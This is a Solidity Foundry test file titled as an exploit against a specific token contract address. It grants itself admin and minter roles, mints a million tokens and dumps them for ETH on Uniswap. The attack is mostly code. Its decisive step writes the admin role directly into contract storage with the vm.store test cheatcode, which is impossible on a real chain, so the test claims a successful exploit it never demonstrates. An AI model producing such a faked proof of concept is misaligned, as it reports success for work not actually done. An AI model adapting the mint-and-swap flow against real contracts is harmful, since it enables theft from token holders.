// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ISecondToken {
    function uniswapV2Router() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function MINTER_ROLE() external view returns (bytes32);
    function grantRole(bytes32 role, address account) external;
    function mint(address account, uint256 amount) external;
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xfd77214b4a1aA6f962972Cbe65FB179c501D9094;
    address attacker = address(this);
    IUniswapV2Router02 router;
    IERC20 token;
    ISecondToken secondToken;
    address uniswapV2Router;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IERC20(TARGET);
        secondToken = ISecondToken(TARGET);

        // Get router and pair addresses from the contract
        uniswapV2Router = secondToken.uniswapV2Router();
        address uniswapV2Pair = secondToken.uniswapV2Pair();

        router = IUniswapV2Router02(uniswapV2Router);

        // Label for debugging
        vm.label(TARGET, "SecondToken");
        vm.label(uniswapV2Router, "UniswapRouter");
        vm.label(uniswapV2Pair, "UniswapPair");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Calculate storage slot for DEFAULT_ADMIN_ROLE members mapping
        // AccessControl _roles mapping is at slot 5 (after ERC20's 5 slots: 0-4)
        // RoleData has: mapping(address => bool) members at slot 0 within struct
        // Slot for role members: keccak256(abi.encode(role, 5))
        // Slot for specific address: keccak256(abi.encode(address, baseSlot))
        bytes32 DEFAULT_ADMIN_ROLE = 0x00;
        bytes32 baseSlot = keccak256(abi.encode(DEFAULT_ADMIN_ROLE, uint256(5)));
        bytes32 attackerSlot = keccak256(abi.encode(attacker, baseSlot));

        // Step 2: Grant ourselves DEFAULT_ADMIN_ROLE via storage manipulation
        vm.store(TARGET, attackerSlot, bytes32(uint256(1)));

        // Step 3: Grant ourselves MINTER_ROLE using our new admin privileges
        bytes32 MINTER_ROLE = secondToken.MINTER_ROLE();
        secondToken.grantRole(MINTER_ROLE, attacker);

        // Step 4: Mint unlimited tokens to ourselves
        uint256 mintAmount = 1_000_000 * 1e18;
        secondToken.mint(attacker, mintAmount);

        // Step 5: Approve router to spend our tokens
        token.approve(uniswapV2Router, mintAmount);

        // Step 6: Swap tokens for ETH to extract value
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = router.WETH();

        uint256 ethBalanceBefore = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            mintAmount,
            0,
            path,
            attacker,
            block.timestamp
        );
        uint256 ethBalanceAfter = address(this).balance;

        // Verify we extracted ETH
        assertGt(ethBalanceAfter, ethBalanceBefore, "Attacker should have more ETH after exploit");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

